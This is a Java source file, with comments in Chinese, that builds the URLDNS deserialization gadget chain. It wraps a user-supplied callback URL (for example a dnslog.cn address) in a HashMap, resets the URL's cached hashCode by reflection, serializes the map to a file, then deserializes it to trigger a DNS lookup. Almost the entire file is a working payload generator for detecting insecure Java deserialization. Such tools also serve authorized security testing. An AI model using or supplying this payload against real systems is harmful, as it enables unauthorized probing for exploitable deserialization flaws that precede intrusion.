package ccgadgets;

import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.util.HashMap;

public class Urldns {
    public static void main(String[] args) throws Exception {
//        新建URLStreamHandler类，并重写URLStreamHandler的openConnection和getHostAddress方法，
//        用于初始化URL对象，并利用重写的getHostAddress方法来避免重复触发gadgets
        URLStreamHandler urlStreamHandler  = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }
            protected synchronized InetAddress getHostAddress(URL u) {
                return null;
            }
        };
        String url = "";
        if (args.length>0){
             url = args[0];
        }
        else {
            System.out.println("请输入URLDNS请求的url参数如：http://xxxxx.dnslog.cn");
            return;
        }
        URL u = new URL(null,url,urlStreamHandler);
        HashMap hashMap = new HashMap();
        hashMap.put(u,url); //如果上面URLStreamHandler没有重写getHostAddress方法，这个将会触发gadgets

//        利用反射方法获取URL对象的私有变量hashcode，并调用其set方法置值为1
        Class  cl = Class.forName("java.net.URL");
        Field field  = cl.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(u,-1);

//        序列化
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("dns"));
        oos.writeObject(hashMap);
//        模拟反序列化 触发gedgets
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("dns"));
        Object o = ois.readObject();

    }
}
